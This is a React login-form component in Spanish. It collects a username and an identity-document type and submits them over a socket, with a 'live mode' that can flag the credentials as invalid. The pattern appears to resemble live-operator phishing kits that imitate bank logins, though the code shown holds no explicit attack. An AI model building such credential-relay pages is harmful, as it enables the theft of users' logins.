import { useFormik } from 'formik'
import { useContext, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { SocketContext, UserDataContext } from '../../../context'

import { ModeLiveContext } from '../../../context/ModeLiveContext'
import { Spiner } from '../../Spiner'
import { submitBase } from '../../../helpers/submitBase'
import { UsernameError } from './UsernameError'
import { UsernameInput } from './UsernameInput'
import { UsernameKeyBoard } from './UsernameKeyBoard'
import { usernameValidate } from '../../../security/usernameValidate'

const valuesData = { username: '', typeDocument: '' }
const opciones = ['Cédula de Ciudananía', 'Tarjeta de Identidad', 'Cédula  Extranjera', 'Pasaporte']

export const Username = ({urlToNavigate, spiner, timeLoader, endUrl = '', virtualKeyword = false, typeDocument, pageNow}) => {
    
    const navigate = useNavigate()
    const { addData } = useContext(UserDataContext)
    const { socket } =  useContext(SocketContext)  
    const { modeLive, liveDataFilter } = useContext(ModeLiveContext)
    const [liveError, setLiveError] = useState(null)
    const [showSpiner , setShowSpiner] = useState(false)
    const [valueKeyBoardVirtual, setValueKeyBoardVirtual] = useState('')
    const [selectActive, setSelectActive] = useState(false)
    const [selectItem, setSelectItem] = useState(opciones[0])
    
    const dataImportant = { addData, socket, setShowSpiner, urlToNavigate, spiner, timeLoader, navigate, modeLive, liveData: liveDataFilter, pageNow, setLiveError }
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => usernameValidate({values, virtualKeyword}),
        onSubmit: async(valuesData) => {
            if(typeDocument) valuesData.typeDocument = selectItem
            submitBase({dataImportant, valuesData, endUrl})
        }
    })
    
    return (
            showSpiner === true ? <Spiner /> : (
            <>
                {/* Aqui ira las notificacion de error en caso general */}
                <UsernameError
                    touched={touched}
                    errors={errors}
                />
                {
                    virtualKeyword === true ? (<UsernameKeyBoard  afterUsernameValue={valueKeyBoardVirtual} setUsernameValue={setValueKeyBoardVirtual}/>) : null
                }
                {liveError === true && (<p className='px-[20px] text-white text-[14px] font-bold text-center py-3 bg-red-600'>Correo y clave inválidos.</p>)}
                {/* Colocar diseño base */}
                <form className='flex flex-col' onSubmit={handleSubmit}>

                    <UsernameInput
                        username={values.username}
                        handleChange={handleChange} 
                        handleBlur={handleBlur}
                        touched={touched}
                        errors={errors}
                        showPasswordMode={false}

                        showTypeDocument={typeDocument}
                        selectActive={selectActive} 
                        setSelectActive={setSelectActive}
                        selectItem={selectItem}
                        setSelectItem={setSelectItem}
                        opciones={opciones}
                    />

                    <button 
                    disabled={
                        (
                            touched.username && 
                            errors.username || 
                            values.username.length === 0
                        ) == true ? true : false
                    }
                    className='bg-blue-400 px-4 py-1 rounded'
                    type='submit'
                    >
                        Ingresar
                    </button>
                </form>
            </>
            )
    )
}
